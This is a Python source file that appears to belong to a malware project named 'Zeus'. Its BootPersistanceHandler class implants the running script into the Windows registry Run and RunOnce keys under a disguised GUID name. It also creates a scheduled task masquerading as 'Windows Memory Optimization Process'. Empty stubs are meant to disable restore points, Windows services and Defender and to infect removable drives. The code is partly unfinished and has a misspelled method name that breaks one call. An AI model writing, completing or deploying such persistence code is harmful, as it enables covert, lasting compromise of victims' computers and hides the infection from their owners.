import platform
import os
import os.path
import subprocess
from shutil import copy

try:
    import _winreg as winreg

    from _winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx
except ImportError:
    try:
        import winreg
        from winreg import CreateKey, OpenKey, ConnectRegistry, SetValueEx
    except ImportError:
        winreg = None

# TODO: Change to WindowsBootPersistManager class
# TODO: Explore infection to: "SYSTEM\CurrentControlSet\Services\Zeus" - load before many service applications and drivers
# TODO: Explore infection to: "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"

class BootPersistanceHandler:

    WINDOWS_START_UP_FOLDER_PREFIX = ""
    WINDOWS_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
    WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"

    WINDOWS_REGISTRY_KEY_NAME = "{60FC6C3A-6AFC-4D03-8B7D-D864AFD83400}"

    #
    # Main
    #

    def addSelfToSystemToBoot(self):
        if (platform.system().lower() == "windows"):
            print("We're on Windows...")

            # 1. Implant to Windows Registry
            if winreg is not None:
                self.implantToRegistry()

            # 2. Copy files to Windows boot
            # NO NEED AS WE WANT IT TO BE HIDDEN
            # self.copyFilesManually()

            # 3. Schedule task in Windows
            self.scheduleTaskInWindows()

            # 4. Disable restore points
            self.disableRestorePoints()

            # 5. Disable windows services
            self.disableWindowsServices()

            # 6. Infect removable devices
            self.infectRemovableDevices()
        elif (platform.system().lower() == "linux"):
            print("We're on Linux...")
        elif (platform.system().lower() == "darwin"):
            print("We're on Mac OS X...")

    #
    # Implant to Windows Registry
    #

    def implantToRegistry(self):
        self.addSelfToRegistryPath(self.WINDOWS_REGISTRY_START_UP_PATH)
        self.addSelfToRegistryPath(self.WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH)

    def addSelfToRegistryPath(self, regPath):
        try:
            isKeyExistsInRegistry = self.checkRegistryKey(regPath, self.WINDOWS_REGISTRY_KEY_NAME, os.path.abspath(__file__))
            if isKeyExistsInRegistry:
                print(r"[i] Zeus already installed in: %s!" % regPath)
            else:
                print(r"[i] Implanting Zeus to windows registry to: %s" % regPath)

                didSaveKeySuccessfully = self.setRegistryValue(self.WINDOWS_REGISTRY_KEY_NAME, os.path.abspath(__file__), regPath)
                if not didSaveKeySuccessfully:
                    print("[e] Error adding Zeus to windows registry run key.")
        except EnvironmentError:
            print(EnvironmentError)

    def setRegistryValue(self, name, value, regPath):
        try:
            winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, regPath)
            registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, regPath, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
            return True
        except WindowsError:
            return False

    def checkRegistryKey(self, regPath, key, value):
        registryConnect = ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        zeusKey = winreg.OpenKey(registryConnect,  regPath)
        keyvalues = self.valuesToDict(zeusKey)
        zeusKey.Close()

        if key in keyvalues:
            result = keyvalues[key]
            if result == value:
                return True

        return False

    def valuesToDict(self, key):
        # Convert a registry key's values to a dictionary
        dict = {}
        size = winreg.QueryInfoKey(key)[1]
        for i in range(size):
            data = winreg.EnumValue(key, i)
            dict[data[0]] = data[1]
        return dict

    #
    # Copy files to Windows boot
    #

    def copyFilesManually(self):
        filePath = os.path.abspath(__file__)
        zeusFileName = os.path.basename(filePath)
        destinationFolder = r"%s%s" % (self.WINDOWS_START_UP_FOLDER_PREFIX, self.WINDOWS_START_UP_FOLDER_SUFFIX,)
        finalDestination = r"%s\%s" % (destinationFolder, zeusFileName)

        if not os.path.isfile(finalDestination):
            source = __file__
            destination = r"%s/%s" % (destinationFolder.replace("\\", "/"), zeusFileName)
            print("[i] Zeus copy itself to: %s" % destination)

            copy(source, destination)
        else:
            destination = r"%s/%s" % (destinationFolder.replace("\\", "/"), zeusFileName)
            print("[i] Zeus already installed in: %s" %destination)

    #
    # Schedule task in Windows
    #

    def scheduleTaskInWindows(self):
        if not self.checkIfTaskExists():
            print("[i] Implanting Zeus to Windows Task Scheduler.")

            fullPath = os.path.abspath(__file__).replace(r"\\\\", r"\\")
            taskCommand = r'schtasks /create /tn "Windows Memory Optimization Process" /sc minute /mo 20 /tr "%s"' % fullPath
            results = subprocess.check_output(taskCommand, shell=True)
        else:
            print("[i] Zeus already installed in Windows Task Scheduler!")

    def checkIfTaskExists(self):
        results = subprocess.check_output("schtasks /query", shell=True)
        results = results.decode("UTF-8")
        if "Windows Memory Optimization Process" not in results:
            return False
        else:
            return True

    #
    # Disable restore points
    #

    def desableRestorePoints(self):
        pass

    #
    # Disable Windows services
    #

    def disableWindowsServices(self):
        pass

    #
    # Infect removable devices
    #

    def infectRemovableDevices(self):
        pass

    #
    # Disable Windows Defender
    #

    def disableWindowsDefender(self):
        pass

    #
    # Start here
    #

    if (platform.system().lower() == "windows"):
        WINDOWS_START_UP_FOLDER_PREFIX = os.environ['userprofile']